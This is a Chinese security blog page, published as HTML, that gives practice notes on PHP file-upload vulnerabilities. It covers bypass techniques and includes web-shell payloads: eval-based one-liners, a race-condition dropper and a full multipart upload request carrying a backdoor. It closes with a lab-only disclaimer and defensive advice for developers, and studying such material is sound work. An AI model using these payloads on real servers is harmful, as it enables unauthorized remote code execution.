@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <link rel="stylesheet" href="/css/custom.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>文件上传：解析、存储与安全最佳实践</title>
+    <meta charset="utf-8">
+    <meta name="description" content="Ladder@文件上传：解析、存储与安全最佳实践 - Hzhsrc home">
+    <meta name="author" content="hzhsec">
+    <link rel="canonical" href="http://118.178.86.67/list/base_bug/%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/up1/">
+
+    <link rel="alternate" type="application/rss+xml" href="http://118.178.86.67//index.xml" title="Hzhsrc home">
+
+    
+
+
+    <meta property="og:title" content="文件上传：解析、存储与安全最佳实践" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://118.178.86.67/list/base_bug/%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/up1/" /><meta property="article:section" content="list" />
+<meta property="article:published_time" content="2024-04-28T10:56:54+08:00" />
+<meta property="article:modified_time" content="2024-04-28T10:56:54+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="文件上传：解析、存储与安全最佳实践"/>
+<meta name="twitter:description" content=""/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "目录",
+      "item": "http://118.178.86.67/list/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "基础漏洞",
+      "item": "http://118.178.86.67/list/base_bug/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  4 ,
+      "name": "文件上传：解析、存储与安全最佳实践",
+      "item": "http://118.178.86.67/list/base_bug/%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/up1/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "文件上传：解析、存储与安全最佳实践",
+  "name": "文件上传：解析、存储与安全最佳实践",
+  "description": "",
+  "keywords": [
+    
+  ],
+  "articleBody": "概览 本文为文件上传漏洞的复现与检测笔记，包含前后端验证类型、常见绕过技巧、以及一些攻击构造示例，便于实战练习（如 Docker labs）。 适用于 PHP 原生上传场景（但很多点可迁移到其它语言/框架）。 upload.jpg\r知识点摘要 1、前端 JS 校验 如何判断是前端校验？ 抓包时：如果在浏览器提示“文件类型不正确”之前，并未出现上传请求（即没有抓到 multipart/form-data 请求），那很可能是前端校验（JS 在提交前阻止了上传）。 实战：绕过前端校验可以通过构造请求（使用 curl / burp / python requests）直接发送 multipart 请求。 2、.htaccess 或 .user.ini 利用 .htaccess 示例： AddType application/x-httpd-php .png 将 .png 识别为 PHP，导致服务器把上传的图片作为 PHP 执行。 .user.ini 示例： auto_prepend_file = getshell.png 通过设置 PHP 配置项使得某些文件被当作入口载入。 3、MIME 类型 上传请求头中 Content-Type: image/png 并不足以保证文件是真正的图片，MIME 可伪造。 服务端不要只依赖 Content-Type 判断文件类型。 4、文件头判断（Magic bytes） 常见文件头示例： GIF：GIF89a 或 GIF87a PNG：前几字节 \\x89PNG\\r\\n\\x1a\\n 仅靠文件头判断也可能被绕过（比如在文件前或后追加 payload，或修改文件头后再恢复等技巧）。 5、黑名单 — 过滤不严（后缀） 简单字符串替换或黑名单可能被绕过，比如 pphphp、在后缀中嵌入无效字符等。 黑名单通常存在无递归替换或正则错误，容易被绕过。 6、大小写问题 文件名或后缀大小写敏感/不敏感导致判断失误（Windows vs Linux 的差异）。 例如 Shell.PHP、shell.Php 等都可能绕过只按小写判断的过滤。 7、低版本 GET 的 %00 截断 在一些早期 PHP/服务器配置中，%00（NULL）截断攻击： GET /var/www/html/upload/x.php%00 GET 请求可能被自动解码一次，从而触发截断。 8、低版本 POST 的 %00 截断 POST 请求不会自动解码，需要二次解码，攻击者可以尝试 ../upload/x.php%00 再二次解码绕过。 9、黑名单绕过举例（fuzz） 使用 fuzz 工具爆破可能会发现： php3、phtml、phps 等可执行扩展 通过 HTML 标签嵌入 PHP 代码（在某些解析器或古老配置下）： 10、逻辑缺陷 — 条件竞争（竞态） 场景：先保存文件，再进行过滤删除；攻击者并发上传可能在删除前触发包含/执行。 示例思路： 服务端保存 xiao.php 并写入恶意代码： \u003c?php fputs(fopen('xiao.php','w'),'\u003c?php eval($_REQUEST[1]);?\u003e');?\u003e 攻击方高速并发上传 / 请求，利用竞态条件执行后门。 11、二次渲染（图片处理导致保留区） 网站通常会对图片做二次渲染（缩放、压缩、转码），这可能删除植入的恶意代码。 绕过思路： 上传一张“正常”的图片，取得渲染后输出文件并比对差异（定位哪些字节被保留）。 在保留区插入后门代码（比如把后门插入到不会被渲染改变的部分）。 通过文件包含或其它路径执行该后门。 需要工具：010 Editor、hex 编辑器、图片差异比对工具。 12、函数缺陷 某些文件系统操作/路径拼接可能被利用，例如： move_uploaded_file($tmp, \"1.php/.\"); 如果保存的文件名可控，可能造成文件被当作可执行文件或放置在可包含目录下。 13、代码审计 — 表单数组绕过 利用表单字段数组或不常见的 Content-Disposition 字段名来绕过服务器端解析： -----------------------------174283082921961 Content-Disposition: form-data; name=\"save_name[0]\" http://2.php/ -----------------------------174283082921961 Content-Disposition: form-data; name=\"save_name[2]\" gif 这种方式经常用来混淆后端解析器，或者在数组索引处理中绕过校验。 附录、无法连接时 — 上传请求包构造示例 下面是一个构造的上传 POST 请求（multipart/form-data）示例，便于在 Burp/Netcat/curl 中复现：\nPOST /index.php?s=/home/page/uploadImg HTTP/1.1 Host: xx.xx.xx.xx:xxxx User-Agent: Mozilla/5.0 ... Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617 Content-Length: 265 ----------------------------921378126371623762173617 Content-Disposition: form-data; name=\"editormd-image-file\"; filename=\"test.\u003c\u003ephp\" Content-Type: text/plain \u003c?php echo 'hello!!!';@eval($_POST['aw'])?\u003e ----------------------------921378126371623762173617-- 注意：上面示例用于实验测试用途，请仅在授权环境中复现。\n使用建议 / 防护要点（开发者方向） 不要只信任前端校验，需要服务端做同样或更严格的校验。 白名单优于黑名单：尽量只允许确切的、已验证的扩展名和 MIME 类型（并结合文件内容检测）。 检查文件内容（magic bytes）并结合库检测图片有效性（GD、ImageMagick 的安全调用）。 保存路径与可执行目录分离：将上传文件存放在不可执行目录，或配置 web server 不执行上传目录内脚本。 对文件名做严格处理：移除特殊字符、规范化路径、禁止 ../ 等父目录引用。 限制可上传大小 / 并发，防止 DoS / 竞态利用。 二次渲染安全：对图片处理组件加固，避免把可控数据保留在最终文件中。 日志与告警：记录异常上传行为（可疑扩展、批量上传等），及时触发审计。 ",
+  "wordCount" : "227",
+  "inLanguage": "en",
+  "datePublished": "2024-04-28T10:56:54+08:00",
+  "dateModified": "2024-04-28T10:56:54+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "hzhsec"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://118.178.86.67/list/base_bug/%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/up1/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Hzhsrc home",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://118.178.86.67/favicon.ico"
+    }
+  }
+}
+</script>
+    <link rel="icon" href="/images/hzhsec.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/hzhsec.png">
+
+<link rel="manifest" href="/images/hzhsec.png">
+    
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />
+
+    
+    
+    <link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" integrity="sha256-7CjwnpRvwN93wYf80NDr3lj8pt6O&#43;44WIPPUXDLU2og=" crossorigin="anonymous" media="screen" />
+
+    
+    <link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />
+
+    
+    <script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
+    </head>
+<body>
+      <main class="wrapper"><nav class="navigation">
+    <section class="container">
+        <a class="navigation-brand" href="/">
+            主页
+        </a>
+        <input type="checkbox" id="menu-toggle" />
+        <label class="menu-button float-right" for="menu-toggle">
+            <span></span><span></span><span></span>
+        </label>
+        
+        <ul class="navigation-list" id="navigation-list">
+            
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/list/">目录</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/archives/">归档</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/message/">关于</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/categories/">分类</a>
+            </li>
+            
+            
+
+            <li class="navigation-item menu-separator">
+                <span>|</span>
+            </li>
+
+            
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="https://github.com/hzhsec">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github">
+      <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+    </svg>
+    </a>
+            </li>
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="/message/">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-mail">
+      <path d="M4 4h16v16H4z"></path><polyline points="4,4 12,12 20,4"></polyline>
+    </svg>
+    </a>
+            </li>
+            
+            
+
+            <li class="navigation-item navigation-dark">
+                <button id="mode" type="button" aria-label="toggle user light or dark theme">
+                    <span class="toggle-dark">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon">
+                            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                        </svg>
+                    </span>
+                    <span class="toggle-light">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun">
+                            <circle cx="12" cy="12" r="5"></circle>
+                            <line x1="12" y1="1" x2="12" y2="3"></line>
+                            <line x1="12" y1="21" x2="12" y2="23"></line>
+                            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                            <line x1="1" y1="12" x2="3" y2="12"></line>
+                            <line x1="21" y1="12" x2="23" y2="12"></line>
+                            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                        </svg>
+                    </span>
+                </button>
+            </li>
+            
+        </ul>
+        
+    </section>
+</nav>
+
+<div id="content">
+<article class="blog-single">
+  <header class="blog-title">
+    <h1>文件上传：解析、存储与安全最佳实践</h1>
+  </header>
+
+  <p>
+  <small>
+    April 28, 2024&nbsp;· 227 words&nbsp;· 2 min</small>
+
+  
+<p>
+
+  <div class="blog-toc">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#概览">概览</a></li>
+    <li><a href="#知识点摘要">知识点摘要</a>
+      <ul>
+        <li><a href="#1前端-js-校验">1、前端 JS 校验</a></li>
+        <li><a href="#2htaccess-或-userini-利用">2、<code>.htaccess</code> 或 <code>.user.ini</code> 利用</a></li>
+        <li><a href="#3mime-类型">3、MIME 类型</a></li>
+        <li><a href="#4文件头判断magic-bytes">4、文件头判断（Magic bytes）</a></li>
+        <li><a href="#5黑名单--过滤不严后缀">5、黑名单 — 过滤不严（后缀）</a></li>
+        <li><a href="#6大小写问题">6、大小写问题</a></li>
+        <li><a href="#7低版本-get-的-00-截断">7、低版本 GET 的 <code>%00</code> 截断</a></li>
+        <li><a href="#8低版本-post-的-00-截断">8、低版本 POST 的 <code>%00</code> 截断</a></li>
+        <li><a href="#9黑名单绕过举例fuzz">9、黑名单绕过举例（fuzz）</a></li>
+        <li><a href="#10逻辑缺陷--条件竞争竞态">10、逻辑缺陷 — 条件竞争（竞态）</a></li>
+        <li><a href="#11二次渲染图片处理导致保留区">11、二次渲染（图片处理导致保留区）</a></li>
+        <li><a href="#12函数缺陷">12、函数缺陷</a></li>
+        <li><a href="#13代码审计--表单数组绕过">13、代码审计 — 表单数组绕过</a></li>
+      </ul>
+    </li>
+    <li><a href="#附录无法连接时--上传请求包构造示例">附录、无法连接时 — 上传请求包构造示例</a></li>
+    <li><a href="#使用建议--防护要点开发者方向">使用建议 / 防护要点（开发者方向）</a></li>
+  </ul>
+</nav>
+  </div>
+
+  <section class="blog-content"><h2 id="概览">概览</h2>
+<ul>
+<li>本文为<strong>文件上传漏洞</strong>的复现与检测笔记，包含前后端验证类型、常见绕过技巧、以及一些攻击构造示例，便于实战练习（如 Docker labs）。</li>
+<li>适用于 PHP 原生上传场景（但很多点可迁移到其它语言/框架）。</li>
+</ul>
+<hr>
+<!--more-->
+<figure>
+<img src="http://118.178.86.67/image/upload.jpg" class="wikilink" alt="upload.jpg" />
+<figcaption aria-hidden="true">upload.jpg</figcaption>
+</figure>
+<img src="http://118.178.86.67/image/upload_tree.jpg" class="wikilink" alt="upload_tree.jpg" />
+<hr>
+<h2 id="知识点摘要">知识点摘要</h2>
+<h3 id="1前端-js-校验">1、前端 JS 校验</h3>
+<ul>
+<li>如何判断是前端校验？
+<ul>
+<li>抓包时：如果在浏览器提示“文件类型不正确”之前，并未出现上传请求（即没有抓到 multipart/form-data 请求），那很可能是<strong>前端校验</strong>（JS 在提交前阻止了上传）。</li>
+</ul>
+</li>
+<li>实战：绕过前端校验可以通过构造请求（使用 curl / burp / python requests）直接发送 multipart 请求。</li>
+</ul>
+<hr>
+<h3 id="2htaccess-或-userini-利用">2、<code>.htaccess</code> 或 <code>.user.ini</code> 利用</h3>
+<ul>
+<li><code>.htaccess</code> 示例：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>AddType application/x-httpd-php .png
+</span></span></code></pre></div><ul>
+<li>将 <code>.png</code> 识别为 PHP，导致服务器把上传的图片作为 PHP 执行。</li>
+<li><code>.user.ini</code> 示例：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>auto_prepend_file = getshell.png
+</span></span></code></pre></div><ul>
+<li>通过设置 PHP 配置项使得某些文件被当作入口载入。</li>
+</ul>
+<hr>
+<h3 id="3mime-类型">3、MIME 类型</h3>
+<ul>
+<li>上传请求头中 <code>Content-Type: image/png</code> 并不足以保证文件是真正的图片，MIME 可伪造。</li>
+<li>服务端不要只依赖 <code>Content-Type</code> 判断文件类型。</li>
+</ul>
+<hr>
+<h3 id="4文件头判断magic-bytes">4、文件头判断（Magic bytes）</h3>
+<ul>
+<li>常见文件头示例：
+<ul>
+<li>GIF：<code>GIF89a</code> 或 <code>GIF87a</code></li>
+<li>PNG：前几字节 <code>\x89PNG\r\n\x1a\n</code></li>
+</ul>
+</li>
+<li>仅靠文件头判断也可能被绕过（比如在文件前或后追加 payload，或修改文件头后再恢复等技巧）。</li>
+</ul>
+<hr>
+<h3 id="5黑名单--过滤不严后缀">5、黑名单 — 过滤不严（后缀）</h3>
+<ul>
+<li>简单字符串替换或黑名单可能被绕过，比如 <code>pphphp</code>、在后缀中嵌入无效字符等。</li>
+<li>黑名单通常存在<strong>无递归</strong>替换或正则错误，容易被绕过。</li>
+</ul>
+<hr>
+<h3 id="6大小写问题">6、大小写问题</h3>
+<ul>
+<li>文件名或后缀大小写敏感/不敏感导致判断失误（Windows vs Linux 的差异）。</li>
+<li>例如 <code>Shell.PHP</code>、<code>shell.Php</code> 等都可能绕过只按小写判断的过滤。</li>
+</ul>
+<hr>
+<h3 id="7低版本-get-的-00-截断">7、低版本 GET 的 <code>%00</code> 截断</h3>
+<ul>
+<li>在一些早期 PHP/服务器配置中，<code>%00</code>（NULL）截断攻击：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>GET /var/www/html/upload/x.php%00
+</span></span></code></pre></div><ul>
+<li>GET 请求可能被自动解码一次，从而触发截断。</li>
+</ul>
+<hr>
+<h3 id="8低版本-post-的-00-截断">8、低版本 POST 的 <code>%00</code> 截断</h3>
+<ul>
+<li>POST 请求不会自动解码，需要二次解码，攻击者可以尝试 <code>../upload/x.php%00</code> 再二次解码绕过。</li>
+</ul>
+<hr>
+<h3 id="9黑名单绕过举例fuzz">9、黑名单绕过举例（fuzz）</h3>
+<ul>
+<li>使用 fuzz 工具爆破可能会发现：
+<ul>
+<li><code>php3</code>、<code>phtml</code>、<code>phps</code> 等可执行扩展</li>
+<li>通过 HTML 标签嵌入 PHP 代码（在某些解析器或古老配置下）：</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;script language=&#34;php&#34;&gt;eval($_POST[&#39;cmd&#39;]); phpinfo();&lt;/script&gt;
+</span></span></code></pre></div><hr>
+<h3 id="10逻辑缺陷--条件竞争竞态">10、逻辑缺陷 — 条件竞争（竞态）</h3>
+<ul>
+<li>场景：先保存文件，再进行过滤删除；攻击者并发上传可能在删除前触发包含/执行。</li>
+<li>示例思路：
+<ul>
+<li>服务端保存 <code>xiao.php</code> 并写入恶意代码：</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;?php fputs(fopen(&#39;xiao.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_REQUEST[1]);?&gt;&#39;);?&gt;
+</span></span></code></pre></div><ul>
+<li>攻击方高速并发上传 / 请求，利用竞态条件执行后门。</li>
+</ul>
+<hr>
+<h3 id="11二次渲染图片处理导致保留区">11、二次渲染（图片处理导致保留区）</h3>
+<ul>
+<li>网站通常会对图片做二次渲染（缩放、压缩、转码），这可能<strong>删除植入的恶意代码</strong>。</li>
+<li>绕过思路：
+<ol>
+<li>上传一张“正常”的图片，取得渲染后输出文件并比对差异（定位哪些字节被保留）。</li>
+<li>在保留区插入后门代码（比如把后门插入到不会被渲染改变的部分）。</li>
+<li>通过文件包含或其它路径执行该后门。</li>
+</ol>
+</li>
+<li>需要工具：010 Editor、hex 编辑器、图片差异比对工具。</li>
+</ul>
+<hr>
+<h3 id="12函数缺陷">12、函数缺陷</h3>
+<ul>
+<li>某些文件系统操作/路径拼接可能被利用，例如：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>move_uploaded_file($tmp, &#34;1.php/.&#34;);
+</span></span></code></pre></div><ul>
+<li>如果保存的文件名可控，可能造成文件被当作可执行文件或放置在可包含目录下。</li>
+</ul>
+<hr>
+<h3 id="13代码审计--表单数组绕过">13、代码审计 — 表单数组绕过</h3>
+<ul>
+<li>利用表单字段数组或不常见的 <code>Content-Disposition</code> 字段名来绕过服务器端解析：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>-----------------------------174283082921961
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;save_name[0]&#34;
+</span></span><span style="display:flex;"><span>http://2.php/
+</span></span><span style="display:flex;"><span>-----------------------------174283082921961
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;save_name[2]&#34;
+</span></span><span style="display:flex;"><span>gif
+</span></span></code></pre></div><ul>
+<li>这种方式经常用来混淆后端解析器，或者在数组索引处理中绕过校验。</li>
+</ul>
+<hr>
+<h2 id="附录无法连接时--上传请求包构造示例">附录、无法连接时 — 上传请求包构造示例</h2>
+<p>下面是一个构造的上传 POST 请求（multipart/form-data）示例，便于在 Burp/Netcat/curl 中复现：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>POST /index.php?s=/home/page/uploadImg HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: xx.xx.xx.xx:xxxx
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 ...
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
+</span></span><span style="display:flex;"><span>Accept: */*
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617
+</span></span><span style="display:flex;"><span>Content-Length: 265
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>----------------------------921378126371623762173617
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;editormd-image-file&#34;; filename=&#34;test.&lt;&gt;php&#34;
+</span></span><span style="display:flex;"><span>Content-Type: text/plain
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;?php echo &#39;hello!!!&#39;;@eval($_POST[&#39;aw&#39;])?&gt;
+</span></span><span style="display:flex;"><span>----------------------------921378126371623762173617--
+</span></span></code></pre></div><blockquote>
+<p>注意：上面示例用于实验测试用途，请仅在授权环境中复现。</p>
+</blockquote>
+<hr>
+<h2 id="使用建议--防护要点开发者方向">使用建议 / 防护要点（开发者方向）</h2>
+<ul>
+<li><strong>不要只信任前端校验</strong>，需要服务端做同样或更严格的校验。</li>
+<li><strong>白名单优于黑名单</strong>：尽量只允许确切的、已验证的扩展名和 MIME 类型（并结合文件内容检测）。</li>
+<li><strong>检查文件内容（magic bytes）并结合库检测图片有效性</strong>（GD、ImageMagick 的安全调用）。</li>
+<li><strong>保存路径与可执行目录分离</strong>：将上传文件存放在不可执行目录，或配置 web server 不执行上传目录内脚本。</li>
+<li><strong>对文件名做严格处理</strong>：移除特殊字符、规范化路径、禁止 <code>../</code> 等父目录引用。</li>
+<li><strong>限制可上传大小 / 并发</strong>，防止 DoS / 竞态利用。</li>
+<li><strong>二次渲染安全</strong>：对图片处理组件加固，避免把可控数据保留在最终文件中。</li>
+<li><strong>日志与告警</strong>：记录异常上传行为（可疑扩展、批量上传等），及时触发审计。</li>
+</ul></section>
+
+  
+  
+  <div class="paginator">
+    
+    <a class="prev" href="http://118.178.86.67/list/base_bug/rce/rce/">
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966C5.98257 11.8297 5.98456 11.9753 6.05061 12.0063C7.05496 12.4779 8.92941 13.9264 9.94496 15M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+      <span>RCE：代码执行/命令执行/绕过技巧</span></a>
+    
+    
+    <a class="next" href="http://118.178.86.67/list/base_bug/sql%E6%B3%A8%E5%85%A5/sql1/"><span>SQL 注入实战与技巧</span>
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966C16.0174 11.8297 16.0154 11.9753 15.9494 12.0063C14.945 12.4779 13.0706 13.9264 12.055 15M15.5556 11.9667C13.1345 12.0608 8 12 6 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+    </a>
+    
+  </div>
+  
+
+  
+
+
+</article>
+
+        </div><footer class="footer">
+  <p>&copy; 2025 <a href="http://118.178.86.67/">Hzhsrc home</a>
+    Powered by
+    <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>
+    <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a>
+️  </p>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M10.5376 22.7916C11.0152 22.7207 22.5795 21.1781 22.0978 10.4211C22.0536 9.43274 21.9303 8.53367 21.7387 7.71865M10.5376 22.7916C16.876 22.3728 20.0969 19.8899 21.5383 16.9142M10.5376 22.7916C9.7707 22.9055 8.97982 22.8964 8.19743 22.7725M21.7387 7.71865C21.4988 6.69828 21.1518 5.80967 20.7188 5.04257M21.7387 7.71865C22.6022 10.1105 23.0542 13.7848 21.5383 16.9142M20.7188 5.04257C17.1684 -1.24629 7.83127 0.632493 4.27577 5.04257C2.88063 6.77451 -0.0433281 11.1668 1.38159 16.6571C2.27481 20.0988 5.17269 22.2936 8.19743 22.7725M20.7188 5.04257C22.0697 6.9404 24.0299 11.3848 22.3541 15.4153M21.5383 16.9142C21.8737 16.4251 22.1428 15.9235 22.3541 15.4153M8.19743 22.7725C12.1971 23.4683 20.6281 22.971 22.3541 15.4153M14 10.945C13.3836 10.289 12.003 8.63215 11.2034 7.04814C11.1703 6.98257 11.0247 6.98456 10.9937 7.05061C10.5221 8.05496 9.07362 9.92941 8 10.945M11.0333 7.44444C10.9392 9.86549 11 15 12 17" stroke="currentColor" stroke-linecap="round"/>
+    </svg>
+</a>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'Copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'Copied';
+            setTimeout(() => {
+                copybutton.innerHTML = 'Copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
